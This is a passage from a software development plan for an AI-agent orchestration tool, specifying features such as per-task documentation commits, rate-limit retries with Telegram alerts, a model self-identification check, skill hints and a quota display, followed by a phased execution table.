routing note: "Grok" here means *whatever model `routing.byRole.docs`
points at* — the mechanism is role-based, the owner routes it to Grok.

**Design:** same injection mechanism as F31 (build F31 first), one more
guidelines block that applies only to docs-role work — both the standing
"Project documentation" task every project gets and F30's per-task
documenter.

**Fix:**
1. **The guidelines text** (a `DOCS_GUIDELINES` const in the engine — not a
   Settings field; documentation standards are the product's opinion, and
   three editable textareas is already enough surface):
   - *README:* lead with what the project does and who it's for, in plain
     language; then quickstart (the exact commands, verified against
     `package.json` — never invent scripts), usage with a real example,
     configuration table, troubleshooting. No fabricated badges, links, or
     claims about features that don't exist yet — check the code before
     asserting.
   - *CHANGELOG:* Keep-a-Changelog shape (`## [version] - date`, grouped
     Added/Changed/Fixed), newest first; entries describe user-visible
     behavior, not commit messages.
   - *Helper docs:* create `docs/` files only when a topic outgrows the
     README (API reference, architecture); every doc says when it was last
     true; cross-link rather than duplicate.
2. **Injection:** `buildAuthorPrompt` appends `DOCS_GUIDELINES` when
   `task.role === "docs"` (alongside F31's blocks; a docs task gets coding +
   security + docs, which is correct — docs tasks still touch the repo).
3. **Beef up `buildDocsTaskDraft`:** the standing task's description and
   acceptance criteria should demand a CHANGELOG.md too ("CHANGELOG.md
   exists with an entry for the initial version") and reference the
   quickstart-commands-must-be-real rule.

**Acceptance:** unit test — a docs-role task's author prompt contains the
docs guidelines and a frontend task's doesn't; the standing docs task's
draft includes the CHANGELOG criterion; live-verify once on a scratch
project that the docs model actually produces a README following the
structure (eyeball, not automated).

### F30. Per-task documentation stage in the merge pipeline

**Owner's ask:** "Once the said task is verified by our validation agent,
each tasks in the kanban card will be documented by grok and then pushed
commit merged" — i.e. the verify → document → push/commit/merge workflow
this repo itself uses, applied to every task the orchestrator lands.

**Where:** `packages/engine/src/orchestrator.ts` `executeTask` — after the
attempts loop exits approved (past the `prNumber == null` guard, ~line 905)
and **before** `syncBranchWithMain`; `@orc/types` `ProjectConfig`;
`ProjectConfigFields.tsx`; CONTRACT.md.

**Design:** after the validator approves (including the approve_anyway /
escalate-approve paths), a documenter run executes in the *same worktree* so
its commit rides the *same PR* — branch → PR → merge stays sacred, and the
docs land atomically with the code they describe. The documenter is
docs-role-routed (`routing.byRole.updates ?? routing.byRole.docs`) and
scope-restricted to documentation files. It must be strictly best-effort: a
documentation failure never blocks a validated merge.

**Fix:**
1. **Config:** `ProjectConfig.perTaskDocs?: boolean`, **default true** (this
   is the owner's requested standard workflow; per-project off-switch for
   repos where it's noise). Validate on PATCH like the other booleans.
2. **The stage,** guarded by the toggle and by `bailIfStopRequested`:
   - Resolve the documenter model; if none is routed, warn-log and skip.
   - Prompt: the task's title/description/acceptance criteria, the attempt
     count and final model, plus instructions: inspect the branch's actual
     changes yourself (`git diff <defaultBranch>...HEAD --stat` and targeted
     diffs); update `CHANGELOG.md` (create it if absent) with an entry for
     this change; touch `README.md`/`docs/**` **only** if this change makes
     them wrong or incomplete; modify nothing else; follow `DOCS_GUIDELINES`
     (F29). Allowed files: `CHANGELOG.md`, `README.md`, `docs/**`.
   - Run it via `adapterFor` with its own AbortController + a hard timeout
     (5 min — docs, not a feature); reuse the `runAuthor` log-streaming
     shape (source `"agent"`, its own run id like `run-<taskId>-docs` so the
     cost and duration land in the runs/costs tables the same way author
     runs do — verify a cost row actually appears, since that path flows
     through `onRunUpdated`).
   - After it returns: if `changedFiles` shows edits **outside** the allowed
     doc paths, `git checkout --` them (revert), warn-log — the documenter
     never gets to change code. Then `commitAll("docs: <task title>")` +
     `push`. Zero changes → fine, continue silently.
   - Any error/timeout: warn-log, continue to merge. Never `requestApproval`
     for a docs failure.
3. **Ordering note:** gates already ran before the validator; the docs
   commit is deliberately not re-gated (it can't touch code — enforced
   above). F15's GitHub-checks gate, when enabled, naturally sees the docs
   commit since it runs after this stage — that's correct and worth a
   sentence in CONTRACT.md.
4. **Stuck-detector note (F15 precedent):** the wait happens inside an
   adapter run with live log streaming, so the Board heartbeat stays honest;
   no extra keepalive needed. Verify `STUCK_DETECTION` scoping doesn't apply
   outside `runAuthor` before assuming (it didn't for F15, but re-check —
   don't trust this paragraph over the code).

**Acceptance:** engine unit tests with a fake adapter: (a) documenter runs
after an `approve` verdict and before merge, and the task still ends `done`;
(b) documenter throwing/timing out → merge still proceeds, warn logged; (c)
`perTaskDocs: false` → no documenter call; (d) out-of-scope documenter edits
are reverted before commit. Live-verify once on a scratch project with a
real model: the merged PR contains a `docs:` commit with a sane CHANGELOG
entry.

### F32. Rate-limit wait-and-retry + fallback alerts on Telegram

**Owner's ask:** "agents might get timedout … or when the usage limit runs
out … add retries that pause the task and try again in a few minutes and
then a fallback agent like deepseek can try to complete the task if retries
doesn't work. I should get alerted in telegram in such cases."

**Where:** `packages/engine/src/orchestrator.ts` `executeTask` (the
`!authorResult.ok` branch, ~line 629); `packages/server/src/engine-runner.ts`
(notifier wiring; the F6 cooldown watcher ~line 356); `packages/server/src/
telegram.ts` (`ServerNotifier`); `@orc/types` `Settings.telegram`;
`Settings.tsx`.

**What exists already (don't rebuild it):** adapters classify rate-limited
failures (`exitReason: "rate_limited"`, F6); a rate-limited run puts the
model on a 5-minute *dispatch* cooldown so **new** tasks route around it
(F6); fallback chains already escalate the *in-flight* task to the next
model — with deepseek in the chain if routing says so (`buildFallbackChain`).
The two gaps: (1) an in-flight task currently falls back **immediately** on
a rate limit, burning a stronger model's slot on what's often a
five-minute wait; (2) nothing pings the owner when any of this happens.

**Fix:**
1. **Wait-and-retry, same model:** in the `!authorResult.ok` branch, when
   `exitReason === "rate_limited"` and the task has used fewer than
   `RATE_LIMIT_RETRIES` (const, 2) waits: emit a warn log, wait
   `RATE_LIMIT_WAIT_MS` (const, 5 min) in short (~5s) slices that check
   `this.paused` and `stopRequested` each slice (a Stop press mid-wait must
   bail immediately — same reasoning as F15's post-wait bail), bump
   `task.maxAttempts++` so the wait doesn't consume a real attempt, then
   `continue` **without** switching models. Track waits in a per-task
   counter cleaned up in the `finally` like the other per-task maps. Only
   `rate_limited` gets this treatment — `stuck`/`error` keep today's
   immediate-fallback behavior (a hung or crashing model won't be fixed by
   waiting; the misclassification risk runs the other way).
2. **Alerts:** new optional `SchedulerDeps.events.onModelTrouble?(info: {
   taskId; taskTitle; model; event: "rate_limit_wait" | "fallback" |
   "exhausted"; detail: string })`, called at: the *first* wait for a task
   (not every wait — one ping, not spam), every fallback switch (all of the
   existing `Switching to fallback model` sites — there are several;
   centralize into a tiny private helper while in there rather than
   five copy-pasted calls), and terminal failure with no fallback left.
   `EngineRunner` forwards to a new `ServerNotifier.modelTrouble(...)`
   Telegram message (short: project, task title, model, what happened, what
   the engine is doing about it) gated by a new
   `Settings.telegram.modelAlerts?: boolean`, **default true** (the owner
   asked for these explicitly; the off-switch is for later). Settings UI
   checkbox next to the existing digest control. `"exhausted"` also fires
   when the *task fails terminally* from the author-failure path even if
   Telegram's digest would already cover the failed status — the digest says
   *what*, this says *why*.
3. **Interplay notes:** the F6 dispatch cooldown is untouched and
   complementary. The known-and-accepted B19 escalation overshoot note
   still stands. Don't add waits to the opencode adapter's internal
   transient-startup retry — that's a different layer handling sub-second
   races, and it's fine.

**Acceptance:** engine unit tests with a fake adapter that fails
rate-limited N times then succeeds: (a) same model retried after the wait
(shrink the wait via an injected/overridable constant — don't sleep 5 real
minutes in CI), attempts budget not consumed by waits; (b) retries exhausted
→ falls back to the next model, `onModelTrouble` saw one `rate_limit_wait` +
one `fallback`; (c) Stop during the wait ends the task promptly with
nothing merged. Telegram side: verified with the scripted-fetch double (the
B8 technique) — the real bot needs the owner's token, mark it "verify on
your deployment".

### F33. Model test round-trip: show the model's own reply

**Owner's ask:** "we do a simple prompt such as 'Write the word hello and
your model name' and wait for a response like 'hello, my model is claude
sonnet 5' and show it to me the user so i can verify it works."

**Where:** `packages/server/src/setup.ts` `testModels` (~line 101);
`apps/web/src/pages/SetupView.tsx` (~line 224).

**What exists already:** `testModels` already runs a real prompt through
every enabled model via the real adapters and already returns `reply` —
and SetupView already renders it, truncated to 80 chars in a footnote style.
The gaps are the prompt (asks for "OK", proving liveness but not identity)
and the presentation.

**Fix:**
1. Prompt → `Say hello and state which AI model you are (name and version),
   in one short line.` Raise the reply capture from 80 → ~200 chars.
2. SetupView: make the reply the *primary* result line for a passing model
   (quoted, readable size), with cost/latency as the secondary caption —
   not the current fine-print footnote.
3. **Honesty note (put it in the UI copy, small):** models self-identify
   approximately — some report a family or an older base-model name rather
   than the marketing name the operator knows. The point of the check is
   "the wiring reaches a live model that answers as roughly the right
   family", corroborated by the cost/latency shown next to it; an exact
   name match is not promised. (This is why the old prompt asked for "OK" —
   keep the new copy from overclaiming.)

**Acceptance:** "Test models" on a live setup shows each model's actual
one-line self-description prominently; a deliberately mis-mapped model
(point an opencode id at the wrong provider) is visibly caught by its reply
or its error; mock mode unaffected.

### F34. Skills strategy: docs + per-project skill hints in prompts

**Owner's ask:** "Figure out a way to efficiently use skills in our
projects by the agents… It might be different in different projects. Or
some skills could be used for all agents in all projects. Im a bit confused
on that so we can figure it out together."

**The mechanics, stated plainly (this is the "figure it out" half):**
- **Skills are a Claude Code feature.** The `claude` runner discovers them
  from two places: `~/.claude/skills/` (user-level → every project on the
  box) and `<repo>/.claude/skills/` (committed to a repo → that project
  only, for anyone/anything running Claude Code in it). Discovery is
  automatic; *reliable* use is not — a headless agent uses a skill when the
  task at hand matches the skill's description, and the strongest lever is
  simply naming the skill in the prompt.
- **opencode models have no skills mechanism.** The equivalent lever is
  instructions text (their `AGENTS.md` convention, or just prompt content).
  So anything "skills" must degrade gracefully to plain prompt text.
- **Therefore the policy:** *universal* skills (things every project
  benefits from) belong at user level on the deployment box, installed
  once; *project-specific* skills belong in the target repo's
  `.claude/skills/`, committed like code; and Hoopedorc's job is just to
  **nudge**: tell the author model which skills matter for this project so
  it reaches for them instead of hoping discovery fires.

**Fix (deliberately small — the mechanism, not a skills marketplace):**
1. `ProjectConfig.skillHints?: string[]` — free-text lines, each "skill
   name — when to use it" (e.g. `frontend-design-guidelines — read before
   building any UI component`). Validate: array of strings, each ≤200
   chars, ≤20 entries (bounded-prompt rule).
2. `buildAuthorPrompt` appends an `## Skills` section when hints exist:
   "The following skills are available in this environment; invoke each
   when its condition applies:" + the lines. Sent to every runner —
   claude-code acts on it natively; for opencode it reads as ordinary
   (harmless, often still useful) instructions.
3. `ProjectConfigFields` Advanced accordion: a small textarea (one hint per
   line).
4. **Docs:** a "Using skills with your agents" section in USER_GUIDE.md
   covering the mechanics + policy above, including the one-time
   "install universal skills at user level on the EC2 box" step and the
   fact that skills only affect the `claude` runner.

**Acceptance:** unit test — hints appear in the author prompt, absent when
unset; guide section exists; live-verify once: a scratch project whose repo
has a trivial committed skill (e.g. one that makes the agent write a marker
file) plus a hint naming it → the marker appears in the agent's output/
worktree, proving the nudge → discovery → use chain end-to-end.

### F35. Quota usage in the Setup health panel

**Where:** `packages/server/src/setup.ts` / the health-panel data route
SetupView reads; `repo.getModelUsageSince` (exists since F16);
`SetupView.tsx`.

**Problem:** F16 enforces quotas invisibly — the operator can't see "how
much of my Claude window have I used" without hitting the wall.

**Fix:** for each model with a `quota` configured, include `windowUsage:
{ runs, costUsd, windowHours }` (one `getModelUsageSince` call) in the
health payload; SetupView renders "N runs / $X this window" (with the
`maxRuns`/`maxCostUsd` limits alongside, e.g. "3/50 runs") in the existing
per-model health row. No new table, no chart.

**Acceptance:** a model with a quota shows its current window usage in
Setup & Health; models without a quota show nothing new; the figures match
a hand-run of the F16 standalone-verification math (or the T1 test's
fixtures).

### What Part 6 deliberately does NOT include (for calibration)

- **F13 phase 1 (gates-only sandbox)** — explicitly deferred again, see the
  decisions block at the top of this Part. It should headline the next
  security-focused wave once the owner settles the Docker-on-EC2 question.
- **Per-project guideline overrides** (F31 is global-only) and **editable
  docs guidelines** (F29 ships as a product-opinion constant) — both are
  cheap later if real use demands them.
- **Service worker / push notifications** — unchanged from Part 5.
- **Automatic model-name assertion in F33** — the test shows the reply and
  lets the human judge; string-matching model self-IDs would fail honestly
  wired setups.

---

## Suggested execution order

| Phase | Items | Rationale | Status |
|---|---|---|---|
| 1 | S1, S2, S3, S4 | Close the injection/exposure holes before anything else touches the network surface. | ✅ done |
| 2 | B1, B2, B3, B4, B5 | The control-plane bugs users hit daily (stop, logs, double-run, run rows, status). | ✅ done |
| 3 | S5, B6–B15 | Hygiene + rails; each is small and independent. | ✅ done |
| 4 | F1, F2, F3, F4 | Core product loop: onboard → understand → intervene → observe. | ✅ done |
| 5 | F5, F6, F7, F8 | Away-from-keyboard autonomy story. | ✅ done |
| 6 | F9, F10, F11, F12 | Per-repo flexibility, packaging, docs. | ✅ done |
| 7 | B16, B17, B18, B19, S6 | Review-pass fixes: confirmed defects in the shipped Phase 6 work. Fix before Phase 8. | ✅ done |
| 8 | F14, F15, F16, F17, F18, F19 | Second feature wave: CI first (F14 — every later PR benefits), then external-CI gate, quota awareness, backups, sandbox doc, scheduled runs (F19 opted into 2026-07-06). | ✅ done |
| 9 | A1–A5, U1–U10 | Post-plan audit fixes, then the UX wave from the full-app walkthrough — badge/header/board layout first (U1–U4 are the high-impact ones), trivial polish after. | ✅ done |
| 10 | B20–B24, S7, F20–F26, U11–U14 | Post-UX-wave audit fixes (the Projects-page Pause footgun first), then the remote-deployment QoL wave: docs → routing → approval context → stop-all → update story → polish → WS/PWA. | ✅ done |
| 11 | B25–B27, T1, F27–F35 | Phase 10 audit fixes (all small), then the server test package (T1 — later items lean on it), then the owner's QoL wave: planning context (F27+F28) → standards prompts (F31 → F29 → F30, in that order — F29/F30 build on F31's injection mechanism) → resilience + alerts (F32) → model test (F33) → skills (F34) → quota panel (F35). Tag `v0.3.0` at the end. | ⬜ open |

Each phase = one or a few PRs. Keep PRs scoped to items; reference the item IDs
(S1, B4, F3…) in commit messages so the audit trail maps back to this plan.

Parts 1–5 (Phases 1–10) are **done** — Phases 1–6 tagged `v0.1.0`,
Phases 7–8 plus the post-plan audit fixes tagged `v0.2.0` (package.json's own
`version` field, previously stale at `0.1.0`, was corrected to match as part
of F24), Phase 9 (A1–A5, U1–U10) closed out Parts 1–4, and Phase 10
(B20–B24, S7, F20–F26, U11–U14) closed out Part 5. **Part 6 (Phase 11) is the
open wave**: B25–B27 + T1 + F27–F35, specced above — work it top-down and tag
`v0.3.0` when it closes. F13 remains future work — F18 covers its design doc
only; see Part 6's decisions block for why it was deferred again and what
would unblock it. Fable independently re-verifies each wave after merge;
verification evidence is in each item's PR description and in this doc's
Progress section above.
